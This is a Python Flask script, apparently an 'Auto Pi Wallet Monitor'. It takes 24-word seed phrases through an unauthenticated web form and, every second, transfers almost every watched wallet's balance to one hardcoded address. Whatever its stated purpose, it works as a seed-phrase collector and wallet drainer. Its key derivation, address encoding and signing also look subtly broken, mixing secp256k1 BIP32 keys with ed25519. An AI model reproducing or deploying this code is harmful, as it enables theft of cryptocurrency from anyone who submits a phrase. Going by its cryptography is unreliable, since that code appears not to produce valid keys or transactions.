
from flask import Flask, request, render_template_string
import threading, time, requests
from mnemonic import Mnemonic
import bip32utils
import base64, hashlib, json

app = Flask(__name__)

SAFE_WALLET = "GBLBP75QQIX2LHI2SAY6OK22US3MMRKKUFXFJ7756CRGISOHMJOZCL2P"
passphrases = []

HTML_FORM = '''
<!doctype html>
<title>Auto Pi Wallet Monitor</title>
<h2>Add Wallet Passphrase</h2>
<form method="POST">
  <textarea name="phrase" rows="5" cols="60" placeholder="Enter 24-word passphrase"></textarea><br><br>
  <input type="submit" value="Add Wallet">
</form>
<h3>Currently Watching:</h3>
<ul>
  {% for p in passphrases %}
    <li>{{ loop.index }}: {{ p[:10] }}...{{ p[-10:] }}</li>
  {% endfor %}
</ul>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        phrase = request.form.get("phrase", "").strip()
        if phrase and phrase not in passphrases:
            passphrases.append(phrase)
    return render_template_string(HTML_FORM, passphrases=passphrases)

def derive_keys(passphrase):
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(passphrase)
    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    child = bip32_root_key_obj.ChildKey(44 + bip32utils.BIP32_HARDEN).ChildKey(314159 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0).ChildKey(0)
    secret = child.WalletImportFormat()
    public_key = child.PublicKey().hex()
    keypair = child
    return keypair, public_key

def get_stellar_address(passphrase):
    kp, _ = derive_keys(passphrase)
    from ed25519 import SigningKey
    sk = SigningKey(kp.PrivateKey()[:32])
    vk = sk.get_verifying_key()
    raw_pub = vk.to_bytes()
    checksum = hashlib.sha256(raw_pub).digest()
    address = base64.b32encode(raw_pub + checksum[:2]).decode("utf-8")
    return "G" + address[1:55]

def check_balance(address):
    try:
        url = f"https://api.mainnet.minepi.com/accounts/{address}"
        res = requests.get(url)
        data = res.json()
        for b in data["balances"]:
            if b["asset_type"] == "native":
                return float(b["balance"])
    except:
        return 0.0
    return 0.0

def build_and_submit_tx(passphrase):
    from ed25519 import SigningKey

    kp, _ = derive_keys(passphrase)
    from_address = get_stellar_address(passphrase)

    url = f"https://api.mainnet.minepi.com/accounts/{from_address}"
    res = requests.get(url)
    data = res.json()
    sequence = str(int(data["sequence"]) + 1)

    send_amount = round(check_balance(from_address) - 0.02, 6)
    if send_amount <= 0:
        return

    tx_template = {
        "source_account": from_address,
        "fee": "100",
        "sequence": sequence,
        "operations": [{
            "type": "payment",
            "destination": SAFE_WALLET,
            "asset": {"type": "native"},
            "amount": str(send_amount)
        }],
        "memo": {"type": "none"},
        "timebounds": {"min_time": "0", "max_time": "0"}
    }

    headers = {"Content-Type": "application/json"}
    tx_xdr = requests.post("https://api.mainnet.minepi.com/transactions/build", json=tx_template, headers=headers).json().get("envelope_xdr")

    # Sign transaction
    tx_hash = hashlib.sha256(base64.b64decode(tx_xdr)).digest()
    sk = SigningKey(kp.PrivateKey()[:32])
    signature = sk.sign(tx_hash)
    sig_base64 = base64.b64encode(signature).decode("utf-8")

    signed_payload = {
        "envelope_xdr": tx_xdr,
        "signatures": [{"hint": base64.b64encode(kp.PublicKey()[-4:]).decode("utf-8"), "signature": sig_base64}]
    }

    result = requests.post("https://api.mainnet.minepi.com/transactions/submit", json=signed_payload, headers=headers)
    print("Submitted TX:", result.json())

def monitor_wallets():
    while True:
        for phrase in passphrases:
            try:
                address = get_stellar_address(phrase)
                balance = check_balance(address)
                if balance > 0.03:
                    print(f"Auto-transferring from: {address}, balance: {balance}")
                    build_and_submit_tx(phrase)
            except Exception as e:
                print("Error:", e)
        time.sleep(1)

threading.Thread(target=monitor_wallets, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
